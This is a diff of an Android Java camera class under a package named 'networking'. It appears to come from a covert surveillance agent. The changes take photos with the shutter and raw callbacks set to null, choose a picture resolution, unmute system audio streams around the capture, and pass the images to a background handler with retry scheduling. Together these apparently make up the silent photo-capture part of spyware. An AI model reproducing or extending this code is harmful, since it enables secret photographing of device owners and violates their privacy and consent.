@@ -3,6 +3,7 @@ package com.android.networking.gui;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.util.List;
 import java.util.concurrent.Callable;
 import java.util.concurrent.TimeUnit;
 
@@ -20,6 +21,7 @@ import android.hardware.Camera;
 import android.hardware.Camera.PictureCallback;
 import android.hardware.Camera.PreviewCallback;
 import android.hardware.Camera.ShutterCallback;
+import android.hardware.Camera.Size;
 import android.media.AudioManager;
 import android.util.Log;
 import android.view.SurfaceHolder;
@@ -31,6 +33,23 @@ public class Preview extends SurfaceView implements SurfaceHolder.Callback {
 	SurfaceHolder mHolder; // <2>
 	public Camera camera; // <3>
 	CGui cgui;
+
+	private static Object cameraLock = new Object();
+
+	private static Size preferredSize = null;
+
+	private SurfaceHolder holder;
+
+	Preview(CGui cGui) {
+		super(cGui);
+		cgui = cGui;
+
+		// Install a SurfaceHolder.Callback so we get notified when the
+		// underlying surface is created and destroyed.
+		mHolder = getHolder(); // <4>
+		mHolder.addCallback(this); // <5>
+		mHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS); // <6>
+	}
 
 	final ShutterCallback shutterCallback = new ShutterCallback() {
 
@@ -52,84 +71,112 @@ public class Preview extends SurfaceView implements SurfaceHolder.Callback {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " onPictureTaken JPEG");//$NON-NLS-1$
 			}
-			
+
 			cgui.callback(_data);
 		}
 	};
-
-	private SurfaceHolder holder;
-
-	Preview(CGui cGui) {
-		super(cGui);
-		cgui = cGui;
-
-		// Install a SurfaceHolder.Callback so we get notified when the
-		// underlying surface is created and destroyed.
-		mHolder = getHolder(); // <4>
-		mHolder.addCallback(this); // <5>
-		mHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS); // <6>
-	}
 
 	// Called once the holder is ready
 	public void surfaceCreated(SurfaceHolder holder) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (surfaceCreated)");
 		}
-		
-		// <7>
-		// The Surface has been created, acquire the camera and tell it where
-		// to draw.
-		camera = Camera.open(); // <8>
+		boolean error = false;
+		synchronized (cameraLock) {
+			try {
+				// <7>
+				// The Surface has been created, acquire the camera and tell it
+				// where
+				// to draw.
+				camera = Camera.open(); // <8>
 
-		Camera.Parameters camParams = camera.getParameters();
-		camParams.set("iso", (String) "400");
-		camera.setParameters(camParams);
+				Camera.Parameters camParams = camera.getParameters();
 
-		try {
-			camera.setPreviewDisplay(holder); // <9>
-			camera.setPreviewCallback(new PreviewCallback() { // <10>
-				// Called for each frame previewed
-				public void onPreviewFrame(byte[] data, Camera camera) { // <11>
-					Preview.this.invalidate(); // <12>
+				if (preferredSize == null) {
+					List<Camera.Size> sizes = camParams.getSupportedPictureSizes();
+					for (Size size : sizes) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (surfaceCreated), size: " + size.width + "/" + size.height);
+						}
+						if (size.width == 1024 || size.width == 1280) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (surfaceCreated), found");
+							}
+							preferredSize = size;
+							break;
+						}
+					}
 				}
-			});
-			camera.startPreview();
-			click();
-		} catch (IOException e) { // <13>
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (startCamera) Error: " + e);
+
+				camParams.setPictureSize(preferredSize.width, preferredSize.height);
+
+				camParams.set("iso", (String) "400");
+				camera.setParameters(camParams);
+			} catch (Exception ex) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (surfaceCreated) Error: " + ex);
+				}
+				error = true;
 			}
-			
+
+			try {
+				if (camera != null) {
+					camera.setPreviewDisplay(holder); // <9>
+					camera.setPreviewCallback(new PreviewCallback() { // <10>
+						// Called for each frame previewed
+						public void onPreviewFrame(byte[] data, Camera camera) { // <11>
+							Preview.this.invalidate(); // <12>
+						}
+					});
+					camera.startPreview();
+					error = !click();
+				}
+
+			} catch (IOException e) { // <13>
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (startCamera) Error: " + e);
+				}
+				error = true;
+			}
+
+		}
+
+		if (error) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (surfaceCreated), error");
+			}
 			Status.self().getStpe().schedule(new Runnable() {
 				public void run() {
 					cgui.callback(null);
 				}
-			}, 1, TimeUnit.SECONDS);
-			
+			}, 100, TimeUnit.MILLISECONDS);
+
+		} else {
+			this.holder = holder;
 		}
 		
-		this.holder = holder;
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (surfaceCreated) : end");
-		}				
+		}
 	}
 
 	public void stopCamera() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (stopCamera)");
+		}
+		synchronized (cameraLock) {
+			if (camera != null) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (stopCamera): not null camera");
+				}
 
-		if (camera != null) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (stopCamera): ");
+				camera.stopPreview();
+				camera.release();
+				camera = null;
 			}
-			camera.stopPreview();
-			try {
-				camera.setPreviewDisplay(null);
-			} catch (IOException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			}
-			camera.release();
-
-			camera = null;
+		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (stopCamera), stopped");
 		}
 	}
 
@@ -143,27 +190,32 @@ public class Preview extends SurfaceView implements SurfaceHolder.Callback {
 
 	// Called when holder has changed
 	public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) { // <15>
-		if (camera != null) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (surfaceChanged)");
-			}
-			
-		}
+
 	}
 
-	public void click() {
+	private boolean click() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (click)");
 		}
-		/*
-		 * audioManager.setRingerMode(AudioManager.RINGER_MODE_VIBRATE);
-		 */
 
-		camera.takePicture(shutterCallback, rawCallback, jpegCallback);
+		if (camera != null) {
+			camera.takePicture(null, null, jpegCallback);
+			// camera.takePicture(shutterCallback, rawCallback,
+			// jpegCallback);
 
-		AudioManager audioManager = (AudioManager) Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);
-		audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, false);
-		audioManager.setStreamMute(AudioManager.STREAM_MUSIC, false);
+			AudioManager audioManager = (AudioManager) Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);
+			audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, false);
+			audioManager.setStreamMute(AudioManager.STREAM_MUSIC, false);
+
+			return true;
+		} else {
+			return false;
+		}
+
+	}
+
+	public void clear() {
+		stopCamera();
 	}
 
 }
